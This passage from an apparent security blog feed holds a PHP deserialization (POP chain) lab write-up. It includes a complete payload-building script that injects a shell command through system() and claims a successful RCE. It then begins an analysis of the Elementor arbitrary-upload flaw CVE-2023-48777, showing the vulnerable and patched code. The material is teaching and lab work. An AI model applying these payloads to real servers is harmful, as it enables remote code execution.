0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;source-code-overview&#34;&gt;&lt;span&gt;Source code overview&lt;/span&gt;&#xA;  &lt;a href=&#34;#source-code-overview&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;class User{&#xA;&#x9;public $name;&#xA;&#x9;private $memo;&#xA;&#x9;function __construct($name){&#xA;&#x9;&#x9;$this-&amp;gt;name=$name;&#xA;&#x9;}&#xA;&#x9;function __wakeup(){&#xA;&#x9;&#x9;$this-&amp;gt;memo=new Note($this -&amp;gt; name.&amp;#34;say hello&amp;#34;, &amp;#39;test_whale&amp;#39;);&#xA;&#x9;}&#xA;&#x9;function __get($content){&#xA;&#x9;&#x9;return $this-&amp;gt;memo;&#xA;&#x9;}&#xA;}&#xA;class Note{&#xA;&#x9;public $content;&#xA;&#x9;public $whale;&#xA;&#x9;function __construct($content, $whale){&#xA;&#x9;&#x9;$this-&amp;gt;content=$content;&#xA;&#x9;&#x9;$this-&amp;gt;whale=$whale;&#xA;&#x9;}&#xA;&#x9;function __toString(){&#xA;&#x9;&#x9;$this-&amp;gt;record($this-&amp;gt;whale, $this-&amp;gt;content);&#xA;&#x9;&#x9;return &amp;#39;Record for &amp;#39;.$this-&amp;gt;whale.&amp;#39; is : &amp;#39;.$this-&amp;gt;content;&#xA;&#x9;}&#xA;&#x9;function record($whale, $content){&#xA;&#x9;&#x9;//check whether it&amp;#39;s an attribute&#xA;&#x9;&#x9;$test=$whale-&amp;gt;$content;&#xA;&#x9;&#x9;if ($test!=NULL){&#xA;&#x9;&#x9;&#x9;echo(&amp;#34;It&amp;#39;s probably an attribute&amp;#34;);&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;}&#xA;class Whale{&#xA;&#x9;public $name;&#xA;&#x9;private $note;&#xA;&#x9;function __construct($name){&#xA;&#x9;&#x9;$this-&amp;gt;name=$name;&#xA;&#x9;}&#xA;&#x9;function take_note($note){&#xA;&#x9;&#x9;$this-&amp;gt;note=date(&amp;#34;Y/m/d H:i:s&amp;#34;).$note;&#xA;&#x9;}&#xA;&#x9;function __get($attribute){&#xA;&#x9;&#x9;system(&amp;#39;echo &amp;#34;&amp;#39;.$this-&amp;gt;name.&amp;#39;&amp;#34; &amp;gt;&amp;gt; log.txt&amp;#39;);&#xA;&#x9;&#x9;return $this-&amp;gt;$attribute;&#xA;&#x9;}&#xA;&#x9;function __toString(){&#xA;&#x9;&#x9;return $this-&amp;gt;name;&#xA;&#x9;}&#xA;}&#xA;if (isset($_POST[&amp;#39;pop&amp;#39;])){&#xA;&#x9;unserialize(base64_decode($_POST[&amp;#39;pop&amp;#39;]));&#xA;}&#xA;?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The main file contains three important classes: &lt;code&gt;User&lt;/code&gt;, &lt;code&gt;Note&lt;/code&gt;, and &lt;code&gt;Whale&lt;/code&gt;. At the end of the file there is an &lt;code&gt;unserialize&lt;/code&gt; on input if &lt;code&gt;$_POST[&#39;pop&#39;]&lt;/code&gt; is provided:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($_POST[&amp;#39;pop&amp;#39;])){&#xA;    unserialize(base64_decode($_POST[&amp;#39;pop&amp;#39;]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Notable points:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Line &lt;strong&gt;8&lt;/strong&gt;: &lt;code&gt;User::__wakeup()&lt;/code&gt; creates a &lt;code&gt;Note&lt;/code&gt; and assigns it to &lt;code&gt;$this-&amp;gt;memo&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Line &lt;strong&gt;23&lt;/strong&gt;: &lt;code&gt;Note::__toString()&lt;/code&gt; calls &lt;code&gt;record()&lt;/code&gt; then returns a string.&lt;/li&gt;&#xA;&lt;li&gt;Line &lt;strong&gt;28&lt;/strong&gt;: &lt;code&gt;Note::record()&lt;/code&gt; accesses &lt;code&gt;$whale-&amp;gt;$content&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Line &lt;strong&gt;44&lt;/strong&gt;: &lt;code&gt;Whale::__get()&lt;/code&gt; calls &lt;code&gt;system(&#39;echo &amp;quot;&#39;.$this-&amp;gt;name.&#39;&amp;quot; &amp;gt;&amp;gt; log.txt&#39;);&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Line &lt;strong&gt;52&lt;/strong&gt;: the &lt;code&gt;unserialize(...)&lt;/code&gt; call — the attack surface.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;execution-flow-leading-to-shell&#34;&gt;&lt;span&gt;Execution flow leading to shell&lt;/span&gt;&#xA;  &lt;a href=&#34;#execution-flow-leading-to-shell&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Unserialize a &lt;code&gt;User&lt;/code&gt;&lt;/strong&gt;: When a &lt;code&gt;User&lt;/code&gt; object is unserialized, the magic method &lt;code&gt;__wakeup()&lt;/code&gt; runs. Here &lt;code&gt;__wakeup()&lt;/code&gt; initializes a new &lt;code&gt;Note&lt;/code&gt; using &lt;code&gt;$this-&amp;gt;name . &amp;quot;say hello&amp;quot;&lt;/code&gt; as content and &lt;code&gt;&#39;test_whale&#39;&lt;/code&gt; as whale:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;memo = new Note($this-&amp;gt;name . &amp;#34;say hello&amp;#34;, &amp;#39;test_whale&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;Note::__toString()&lt;/code&gt; calls &lt;code&gt;record()&lt;/code&gt;&lt;/strong&gt;: &lt;code&gt;__toString()&lt;/code&gt; in &lt;code&gt;Note&lt;/code&gt; calls &lt;code&gt;record($this-&amp;gt;whale, $this-&amp;gt;content)&lt;/code&gt; before returning the string. &lt;code&gt;__toString()&lt;/code&gt; is invoked when the object is cast to a string. We can abuse &lt;code&gt;$this-&amp;gt;name&lt;/code&gt; so that it is an object in the Note; it will be cast to string when concatenated with &lt;code&gt;&amp;quot;say hello&amp;quot;&lt;/code&gt; at line 9.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;record()&lt;/code&gt; accesses a dynamic property on &lt;code&gt;$whale&lt;/code&gt;&lt;/strong&gt;: Inside &lt;code&gt;record()&lt;/code&gt; there is:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$test = $whale-&amp;gt;$content;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;code&gt;$whale&lt;/code&gt; is a &lt;code&gt;Whale&lt;/code&gt; object and &lt;code&gt;$content&lt;/code&gt; does not match an existing property, PHP will call the magic &lt;code&gt;Whale::__get($attribute)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;Whale::__get()&lt;/code&gt; executes &lt;code&gt;system()&lt;/code&gt;&lt;/strong&gt;: &lt;code&gt;Whale::__get()&lt;/code&gt; contains:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;system(&amp;#39;echo &amp;#34;&amp;#39;.$this-&amp;gt;name.&amp;#39;&amp;#34; &amp;gt;&amp;gt; log.txt&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Because &lt;code&gt;system()&lt;/code&gt; invokes a shell, if &lt;code&gt;$this-&amp;gt;name&lt;/code&gt; contains command-breaking characters (for example &lt;code&gt;&amp;quot;; ls /; echo &amp;quot;&lt;/code&gt;), an attacker can inject and execute shell commands leading to RCE.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Create a file similar to the original but containing code that builds the serialized payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;class User{&#xA;&#x9;public $name;&#xA;&#x9;private $memo;&#xA;&#x9;function __construct(){&#xA;&#x9;&#x9;$this-&amp;gt;name= new Note(&amp;#34;Top2&amp;#34;,new Whale((&amp;#39;&amp;#34;; ls /; echo &amp;#34;&amp;#39;)));&#xA;&#x9;}&#xA;&#x9;function __wakeup(){&#xA;&#x9;&#x9;$this-&amp;gt;memo=new Note($this -&amp;gt; name.&amp;#34;say hello&amp;#34;, &amp;#39;test_whale&amp;#39;);&#xA;&#x9;}&#xA;&#x9;function __get($content){&#xA;&#x9;&#x9;return $this-&amp;gt;memo;&#xA;&#x9;}&#xA;}&#xA;class Note{&#xA;&#x9;public $content;&#xA;&#x9;public $whale;&#xA;&#x9;function __construct($content, $whale){&#xA;&#x9;&#x9;$this-&amp;gt;content=$content;&#xA;&#x9;&#x9;$this-&amp;gt;whale=$whale;&#xA;&#x9;}&#xA;&#x9;function __toString(){&#xA;&#x9;&#x9;$this-&amp;gt;record($this-&amp;gt;whale, $this-&amp;gt;content);&#xA;&#x9;&#x9;return &amp;#39;Record for &amp;#39;.$this-&amp;gt;whale.&amp;#39; is : &amp;#39;.$this-&amp;gt;content;&#xA;&#x9;}&#xA;&#x9;function record($whale, $content){&#xA;&#x9;&#x9;//check whether it&amp;#39;s an attribute&#xA;&#x9;&#x9;$test=$whale-&amp;gt;$content;&#xA;&#x9;&#x9;if ($test!=NULL){&#xA;&#x9;&#x9;&#x9;echo(&amp;#34;It&amp;#39;s probably an attribute&amp;#34;);&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;}&#xA;class Whale{&#xA;&#x9;public $name;&#xA;&#x9;private $note;&#xA;&#x9;function __construct($name){&#xA;&#x9;&#x9;$this-&amp;gt;name=$name;&#xA;&#x9;}&#xA;&#x9;function take_note($note){&#xA;&#x9;&#x9;$this-&amp;gt;note=date(&amp;#34;Y/m/d H:i:s&amp;#34;).$note;&#xA;&#x9;}&#xA;&#x9;function __get($attribute){&#xA;&#x9;&#x9;system(&amp;#39;echo &amp;#34;&amp;#39;.$this-&amp;gt;name.&amp;#39;&amp;#34; &amp;gt;&amp;gt; log.txt&amp;#39;);&#xA;&#x9;&#x9;return $this-&amp;gt;$attribute;&#xA;&#x9;}&#xA;&#x9;function __toString(){&#xA;&#x9;&#x9;return $this-&amp;gt;name;&#xA;&#x9;}&#xA;}&#xA;&#xA;$u = new User();&#xA;$searialize = serialize($u);&#xA;echo base64_encode(&amp;#39;&amp;#39;. $searialize .&amp;#39;&amp;#39;);&#xA;?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Run this file and copy the returned base64 string:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/base64_return.png&#34; title=&#34;Returned base64 string&#34; data-thumbnail=&#34;/posts/2025-11-11-pop-chain-lab1/base64_return.png&#34; data-sub-html=&#34;&lt;h2&gt;Base64&lt;/h2&gt;&lt;p&gt;Returned base64 string&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/base64_return.png&#39; alt=&#34;Base64&#34; height=&#34;450&#34; width=&#34;1542&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Returned base64 string&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Send the request according to the challenge:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/result.png&#34; title=&#34;Successful RCE&#34; data-thumbnail=&#34;/posts/2025-11-11-pop-chain-lab1/result.png&#34; data-sub-html=&#34;&lt;h2&gt;RCE&lt;/h2&gt;&lt;p&gt;Successful RCE&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/result.png&#39; alt=&#34;RCE&#34; height=&#34;593&#34; width=&#34;1542&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Successful RCE&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2023-48777 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-10-cve-2023-48777/</link>
      <pubDate>Mon, 10 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-10-cve-2023-48777/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;An &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; vulnerability in the &lt;strong&gt;Elementor Website Builder&lt;/strong&gt; plugin for WordPress. This issue affects &lt;strong&gt;Elementor Website Builder&lt;/strong&gt; versions from &lt;strong&gt;3.3.0&lt;/strong&gt; to &lt;strong&gt;3.18.1&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-48777&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2023-48777&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.3.0-3.18.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.18.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Elementor Website Builder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Elementor Website Builder&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.3.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.18.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability stems from &lt;strong&gt;not validating the file type&lt;/strong&gt; before saving to the &lt;strong&gt;server&lt;/strong&gt;, allowing an attacker to upload files with dangerous formats.&lt;/p&gt;&#xA;&lt;p&gt;In version &lt;strong&gt;3.18.1&lt;/strong&gt;, the function &lt;code&gt;handle_elementor_upload()&lt;/code&gt; does not verify the &lt;code&gt;file type&lt;/code&gt; when processing upload data from the &lt;code&gt;fileData&lt;/code&gt; parameter:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) {&#xA;    if ( isset( $file[&amp;#39;fileData&amp;#39;] ) ) {&#xA;        $file = $this-&amp;gt;save_base64_to_tmp_file( $file );&#xA;    }&#xA;&#xA;    $validation_result = $this-&amp;gt;validate_file( $file, $allowed_file_extensions );&#xA;&#xA;    if ( is_wp_error( $validation_result ) ) {&#xA;        return $validation_result;&#xA;    }&#xA;&#xA;    return $file;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;private function save_base64_to_tmp_file( $file ) {&#xA;    $file_content = base64_decode( $file[&amp;#39;fileData&amp;#39;] ); // phpcs:ignore&#xA;&#xA;    // If the decode fails&#xA;    if ( ! $file_content ) {&#xA;        return new \WP_Error( &amp;#39;file_error&amp;#39;, self::INVALID_FILE_CONTENT );&#xA;    }&#xA;&#xA;    $temp_filename = $this-&amp;gt;create_temp_file( $file_content, $file[&amp;#39;fileName&amp;#39;] );&#xA;&#xA;    if ( is_wp_error( $temp_filename ) ) {&#xA;        return $temp_filename;&#xA;    }&#xA;&#xA;    return [&#xA;        // the original uploaded file name&#xA;        &amp;#39;name&amp;#39; =&amp;gt; $file[&amp;#39;fileName&amp;#39;],&#xA;        // The path to the temporary file&#xA;        &amp;#39;tmp_name&amp;#39; =&amp;gt; $temp_filename,&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the patch &lt;strong&gt;3.18.2&lt;/strong&gt;, the developer &lt;strong&gt;added a valid file type check&lt;/strong&gt; before saving by passing an extra parameter &lt;code&gt;$allowed_file_extensions&lt;/code&gt; into &lt;code&gt;save_base64_to_tmp_file()&lt;/code&gt;, preventing uploads of malicious files:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) {&#xA;    if ( isset( $file[&amp;#39;fileData&amp;#39;] ) ) {&#xA;        $file = $this-&amp;gt;save_base64_to_tmp_file( $file, $allowed_file_extensions );&#xA;    }&#xA;&#xA;    $validation_result = $this-&amp;gt;validate_file( $file, $allowed_file_extensions );&#xA;&#xA;    if ( is_wp_error( $validation_result ) ) {&#xA;        return $validation_result;&#xA;    }&#xA;&#xA;    return $file;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;private function save_base64_to_tmp_file( $file, $allowed_file_extensions = null ) {&#xA;    $file_extension = pathinfo( $file[&amp;#39;fileName&amp;#39;], PATHINFO_EXTENSION );&#xA;    $is_file_type_allowed = $this-&amp;gt;is_file_type_allowed( $file_extension, $allowed_file_extensions );&#xA;&#xA;    if ( is_wp_error( $is_file_type_allowed ) ) {&#xA;        return $is_file_type_allowed;&#xA;    }&#xA;&#xA;    $file_content = base64_decode( $file[&amp;#39;fileData&amp;#39;] ); // phpcs:ignore&#xA;&#xA;    // If the decode fails&#xA;    if ( ! $file_content ) {&#xA;        return new \WP_Error( &amp;#39;file_error&amp;#39;, self::INVALID_FILE_CONTENT );&#xA;    }&#xA;&#xA;    $temp_filename = $this-&amp;gt;create_temp_file( $file_content, $file[&amp;#39;fileName&amp;#39;] );&#xA;&#xA;    if ( is_wp_error( $temp_filename ) ) {&#xA;        return $temp_filename;&#xA;    }&#xA;&#xA;    return [&#xA;        // the original uploaded file name&#xA;        &amp;#39;name&amp;#39; =&amp;gt; $file[&amp;#39;fileName&amp;#39;],&#xA;        // The path to the temporary file&#xA;        &amp;#39;tmp_name&amp;#39; =&amp;gt; $temp_filename,&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 